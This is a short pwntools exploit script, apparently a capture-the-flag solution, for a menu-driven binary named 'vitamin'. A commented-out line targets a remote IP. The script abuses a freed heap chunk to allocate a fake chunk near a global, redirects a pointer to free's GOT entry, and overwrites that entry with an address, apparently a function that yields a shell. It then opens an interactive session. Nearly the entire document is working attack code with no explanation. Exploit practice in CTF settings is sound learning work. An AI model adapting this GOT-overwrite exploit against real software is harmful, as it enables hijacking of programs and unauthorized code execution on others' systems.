from pwn import * 
#context.log_level='debug' 
#context.terminal=['bash'] 
p=process('./vitamin') 
#p=remote('159.65.68.241', 10001) 
def debug(addr = '0x400BC7'):     
  gdb.attach(proc.pidof(p)[0]+1, "b *" + addr)     
  raw_input('debug:') 
 
def create(formula):     
  p.recvuntil(':\n')     
  p.sendline('1')     
  p.recvuntil(':\n')     
  p.sendline(formula) 
 
def change(formula):     
  p.recvuntil(':\n')     
  p.sendline('3')     
  p.recvuntil(':\n')     
  p.sendline(formula) 
 
def take():     
  p.recvuntil(':\n')     
  p.sendline('2') #debug() 
 
free_got=0x602018 
create('aaaa') 
#debug()
gdb.attach(p)
take() 
change(p64(0x6020dd)) 
create(p64(0x6020dd)) 
create('A'*11+p64(free_got)) 
#debug()
change(p64(0x400d58)) 
p.sendline('2') 
take()
p.interactive()
